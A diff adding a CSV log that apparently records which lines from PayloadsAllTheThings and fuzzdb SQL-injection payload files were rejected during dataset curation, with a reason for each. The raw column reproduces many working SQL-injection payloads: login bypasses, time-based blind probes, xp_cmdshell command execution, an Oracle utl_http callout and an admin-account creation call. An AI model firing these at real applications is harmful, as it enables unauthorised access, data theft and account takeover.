@@ -1,0 +1,707 @@
+repo,file,line,raw,reason
+PayloadsAllTheThings,SQL Injection/Intruder/Auth_Bypass.txt,1,'-',no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/Auth_Bypass.txt,2,' ',no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/Auth_Bypass.txt,3,'&',no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/Auth_Bypass.txt,4,'^',no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/Auth_Bypass.txt,5,'*',no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/Auth_Bypass.txt,11,"""-""",no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/Auth_Bypass.txt,12,""" """,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/Auth_Bypass.txt,13,"""&""",no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/Auth_Bypass.txt,14,"""^""",no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/Auth_Bypass.txt,15,"""*""",no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/Auth_Bypass2.txt,1,==,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/Auth_Bypass2.txt,2,=,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/Auth_Bypass2.txt,3,',no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/Auth_Bypass2.txt,6,' –,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/Auth_Bypass2.txt,15, or 1=1,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/Auth_Bypass2.txt,41, or 1=1,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/Auth_Bypass2.txt,42, or 1=1--,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/Auth_Bypass2.txt,43, or 1=1/*,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/Auth_Bypass2.txt,44, or 1=1#,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/Auth_Bypass2.txt,55,' or 1=1--,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/Auth_Bypass2.txt,110,' or 'x'='x,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/Auth_Bypass2.txt,112,""" or ""x""=""x",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/FUZZDB_MSSQL.txt,1,# you will need to customize/modify some of the values in the queries for best effect,comment
+PayloadsAllTheThings,SQL Injection/Intruder/FUZZDB_MSSQL.txt,11,' or 1=1 --,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/FUZZDB_MSSQL_Enumeration.txt,1,# ms-sqli info disclosure payload fuzzfile,comment
+PayloadsAllTheThings,SQL Injection/Intruder/FUZZDB_MSSQL_Enumeration.txt,2,# replace regex with your fuzzer for best results <attackerip> <sharename>,comment
+PayloadsAllTheThings,SQL Injection/Intruder/FUZZDB_MSSQL_Enumeration.txt,3,"# run wireshark or tcpdump, look for incoming smb or icmp packets from victim",comment
+PayloadsAllTheThings,SQL Injection/Intruder/FUZZDB_MSSQL_Enumeration.txt,4,# might need to terminate payloads with ;--,comment
+PayloadsAllTheThings,SQL Injection/Intruder/FUZZDB_MYSQL.txt,1,1'1,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/FUZZDB_MySQL_ReadLocalFiles.txt,1,# mysql local file disclosure through sqli,comment
+PayloadsAllTheThings,SQL Injection/Intruder/FUZZDB_MySQL_ReadLocalFiles.txt,2,# fuzz interesting absolute filepath/filename into <filepath>,comment
+PayloadsAllTheThings,SQL Injection/Intruder/FUZZDB_Oracle.txt,1,# contains statements from jbrofuzz,comment
+PayloadsAllTheThings,SQL Injection/Intruder/FUZZDB_Oracle.txt,3,' or '1'='1,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/FUZZDB_Oracle.txt,56,,empty
+PayloadsAllTheThings,SQL Injection/Intruder/FUZZDB_Postgres_Enumeration.txt,1,# info disclosure payload fuzzfile for pgsql,comment
+PayloadsAllTheThings,SQL Injection/Intruder/FUZZDB_Postgres_Enumeration.txt,12,select current_setting('port');,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/Generic_Fuzz.txt,1,1,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/Generic_Fuzz.txt,2,1',no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/Generic_Fuzz.txt,3,"1""",no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/Generic_Fuzz.txt,4,[1],no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/Generic_Fuzz.txt,5,1`,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/Generic_Fuzz.txt,6,1\,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/Generic_Fuzz.txt,10,1' or '1'='1,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/Generic_Fuzz.txt,11,1 or 1=1,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/Generic_TimeBased.txt,1,# from wapiti,comment
+PayloadsAllTheThings,SQL Injection/Intruder/Generic_TimeBased.txt,82,"'\""",no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/Generic_UnionSelect.txt,1, ORDER BY SLEEP(5),duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/Generic_UnionSelect.txt,15," ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/Generic_UnionSelect.txt,32, ORDER BY SLEEP(5)#,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/Generic_UnionSelect.txt,46," ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/Generic_UnionSelect.txt,63, ORDER BY SLEEP(5)-- ,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/Generic_UnionSelect.txt,77," ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- ",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-INSERT,1,)%20waitfor%20delay%20'0:0:20'%20/*,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-INSERT,2,)%20waitfor%20delay%20'0:0:20'%20--,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-INSERT,3,')%20waitfor%20delay%20'0:0:20'%20/*,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-INSERT,4,')%20waitfor%20delay%20'0:0:20'%20--,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-INSERT,5,""")%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-INSERT,6,""")%20waitfor%20delay%20'0:0:20'%20--",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-INSERT,7,))%20waitfor%20delay%20'0:0:20'%20/*,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-INSERT,8,))%20waitfor%20delay%20'0:0:20'%20--,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-INSERT,9,'))%20waitfor%20delay%20'0:0:20'%20/*,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-INSERT,10,'))%20waitfor%20delay%20'0:0:20'%20--,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-INSERT,11,"""))%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-INSERT,12,"""))%20waitfor%20delay%20'0:0:20'%20--",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,1, waitfor delay '0:0:20' /* ,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,2, waitfor delay '0:0:20' --,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,3,' waitfor delay '0:0:20' /* ,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,4,' waitfor delay '0:0:20' --,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,5,""" waitfor delay '0:0:20' /* ",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,6,""" waitfor delay '0:0:20' --",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,7,) waitfor delay '0:0:20' /* ,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,8,) waitfor delay '0:0:20' --,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,9,)) waitfor delay '0:0:20' /* ,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,10,)) waitfor delay '0:0:20' --,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,11,))) waitfor delay '0:0:20' /* ,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,12,))) waitfor delay '0:0:20' --,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,13,)))) waitfor delay '0:0:20' /* ,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,14,)))) waitfor delay '0:0:20' --,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,15,))))) waitfor delay '0:0:20' --,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,16,)))))) waitfor delay '0:0:20' --,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,17,') waitfor delay '0:0:20' /* ,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,18,') waitfor delay '0:0:20' --,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,19,""") waitfor delay '0:0:20' /* ",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,20,""") waitfor delay '0:0:20' --",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,21,')) waitfor delay '0:0:20' /* ,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,22,')) waitfor delay '0:0:20' --,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,23,""")) waitfor delay '0:0:20' /* ",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,24,""")) waitfor delay '0:0:20' --",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,25,'))) waitfor delay '0:0:20' /* ,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,26,'))) waitfor delay '0:0:20' --,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,27,"""))) waitfor delay '0:0:20' /* ",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,28,"""))) waitfor delay '0:0:20' --",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,29,')))) waitfor delay '0:0:20' /* ,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,30,')))) waitfor delay '0:0:20' --,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,31,""")))) waitfor delay '0:0:20' /* ",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,32,""")))) waitfor delay '0:0:20' --",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,33,'))))) waitfor delay '0:0:20' /* ,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,34,'))))) waitfor delay '0:0:20' --,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,35,"""))))) waitfor delay '0:0:20' /* ",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,36,"""))))) waitfor delay '0:0:20' --",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,37,')))))) waitfor delay '0:0:20' /* ,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,38,')))))) waitfor delay '0:0:20' --,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,39,""")))))) waitfor delay '0:0:20' /* ",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MSSQL-WHERE,40,""")))))) waitfor delay '0:0:20' --",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,1," and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,2," and 0=benchmark(3000000,MD5(1))%20--",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,3," and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,4,"' and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,5,"' and 0=benchmark(3000000,MD5(1))%20--",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,6,"' and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,7,""" and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,8,""" and 0=benchmark(3000000,MD5(1))%20--",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,9,""" and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,10,") and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,11,") and 0=benchmark(3000000,MD5(1))%20--",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,12,") and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,13,")) and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,14,")) and 0=benchmark(3000000,MD5(1))%20--",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,15,")) and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,16,"))) and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,17,"))) and 0=benchmark(3000000,MD5(1))%20--",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,18,"))) and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,19,")))) and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,20,")))) and 0=benchmark(3000000,MD5(1))%20--",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,21,")))) and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,22,"') and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,23,"') and 0=benchmark(3000000,MD5(1))%20--",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,24,"') and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,25,""") and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,26,""") and 0=benchmark(3000000,MD5(1))%20--",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,27,""") and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,28,"')) and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,29,"')) and 0=benchmark(3000000,MD5(1))%20--",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,30,"')) and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,31,""")) and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,32,""")) and 0=benchmark(3000000,MD5(1))%20--",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,33,""")) and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,34,"'))) and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,35,"'))) and 0=benchmark(3000000,MD5(1))%20--",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,36,"'))) and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,37,"""))) and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,38,"""))) and 0=benchmark(3000000,MD5(1))%20--",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,39,"""))) and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,40,"')))) and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,41,"')))) and 0=benchmark(3000000,MD5(1))%20--",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,42,"')))) and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,43,""")))) and 0=benchmark(3000000,MD5(1))%20/*",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,44,""")))) and 0=benchmark(3000000,MD5(1))%20--",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/payloads-sql-blind-MySQL-WHERE,45,""")))) and 0=benchmark(3000000,MD5(1))%20%23",duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,1,',no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,2,'',no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,3,`,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,4,``,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,5,",",no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,6,"""",no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,7,"""""",no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,8,/,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,9,//,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,10,\,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,11,\\,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,12,;,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,23, OR 1=1,duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,27,%00,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,28,/*…*/ ,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,29,"+		addition, concatenate (or space in url)",no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,30,||		(double pipe) concatenate,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,31,%		wildcard attribute indicator,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,32,@variable	local variable,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,34,# Numeric,comment
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,41,1*56,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,42,-2,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,58,Finding the table name,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,59,Time-Based:,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,61,%2c(select%20*%20from%20(select(sleep(10)))a),duplicate
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,63,Comments:,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,64,#	    Hash comment,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,65,/*  	C-style comment,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,66,-- -	SQL comment,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,67,;%00	Nullbyte,no_sql_token
+PayloadsAllTheThings,SQL Injection/Intruder/SQL-Injection,68,`	    Backtick,no_sql_token
+fuzzdb,attack/sql-injection/detect/Generic_SQLI.txt,1,,empty
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,1,sleep(__TIME__)#,duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,2,1 or sleep(__TIME__)#,duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,3,""" or sleep(__TIME__)#",duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,4,' or sleep(__TIME__)#,duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,5,""" or sleep(__TIME__)=""",duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,6,' or sleep(__TIME__)=',duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,7,1) or sleep(__TIME__)#,duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,8,""") or sleep(__TIME__)=""",duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,9,') or sleep(__TIME__)=',duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,10,1)) or sleep(__TIME__)#,duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,11,""")) or sleep(__TIME__)=""",duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,12,')) or sleep(__TIME__)=',duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,13,;waitfor delay '0:0:__TIME__'--,duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,14,);waitfor delay '0:0:__TIME__'--,duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,15,';waitfor delay '0:0:__TIME__'--,duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,16,""";waitfor delay '0:0:__TIME__'--",duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,17,');waitfor delay '0:0:__TIME__'--,duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,18,""");waitfor delay '0:0:__TIME__'--",duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,19,));waitfor delay '0:0:__TIME__'--,duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,20,'));waitfor delay '0:0:__TIME__'--,duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,21,"""));waitfor delay '0:0:__TIME__'--",duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,22,"benchmark(10000000,MD5(1))#",duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,23,"1 or benchmark(10000000,MD5(1))#",duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,24,""" or benchmark(10000000,MD5(1))#",duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,25,"' or benchmark(10000000,MD5(1))#",duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,26,"1) or benchmark(10000000,MD5(1))#",duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,27,""") or benchmark(10000000,MD5(1))#",duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,28,"') or benchmark(10000000,MD5(1))#",duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,29,"1)) or benchmark(10000000,MD5(1))#",duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,30,""")) or benchmark(10000000,MD5(1))#",duplicate
+fuzzdb,attack/sql-injection/detect/GenericBlind.txt,31,"')) or benchmark(10000000,MD5(1))#",duplicate
+fuzzdb,attack/sql-injection/detect/MSSQL.txt,1,; --,no_sql_token
+fuzzdb,attack/sql-injection/detect/MSSQL.txt,4,'; exec master..xp_cmdshell 'ping 10.10.1.2'--,duplicate
+fuzzdb,attack/sql-injection/detect/MSSQL.txt,5,' grant connect to name; grant resource to name; --,duplicate
+fuzzdb,attack/sql-injection/detect/MSSQL.txt,6,' or 1=1 -- ,duplicate
+fuzzdb,attack/sql-injection/detect/MSSQL.txt,7,' union (select @@version) --,duplicate
+fuzzdb,attack/sql-injection/detect/MSSQL.txt,8,"' union (select NULL, (select @@version)) --",duplicate
+fuzzdb,attack/sql-injection/detect/MSSQL.txt,9,"' union (select NULL, NULL, (select @@version)) --",duplicate
+fuzzdb,attack/sql-injection/detect/MSSQL.txt,10,"' union (select NULL, NULL, NULL,  (select @@version)) --",duplicate
+fuzzdb,attack/sql-injection/detect/MSSQL.txt,11,"' union (select NULL, NULL, NULL, NULL,  (select @@version)) --",duplicate
+fuzzdb,attack/sql-injection/detect/MSSQL.txt,12,"' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --",duplicate
+fuzzdb,attack/sql-injection/detect/MySQL.txt,1,1'1,no_sql_token
+fuzzdb,attack/sql-injection/detect/MySQL.txt,2,1 exec sp_ (or exec xp_),duplicate
+fuzzdb,attack/sql-injection/detect/MySQL.txt,3,1 and 1=1,duplicate
+fuzzdb,attack/sql-injection/detect/MySQL.txt,4,1' and 1=(select count(*) from tablenames); --,duplicate
+fuzzdb,attack/sql-injection/detect/MySQL.txt,5,1 or 1=1,duplicate
+fuzzdb,attack/sql-injection/detect/MySQL.txt,6,1' or '1'='1,duplicate
+fuzzdb,attack/sql-injection/detect/MySQL_MSSQL.txt,1,1,no_sql_token
+fuzzdb,attack/sql-injection/detect/MySQL_MSSQL.txt,4,1\'1,no_sql_token
+fuzzdb,attack/sql-injection/detect/MySQL_MSSQL.txt,10,,empty
+fuzzdb,attack/sql-injection/detect/oracle.txt,1,’ or ‘1’=’1,duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,2,' or '1'='1,duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,3,'||utl_http.request('httP://192.168.1.1/')||',duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,4,"' || myappadmin.adduser('admin', 'newpass') || '",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,5,' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i,duplicate
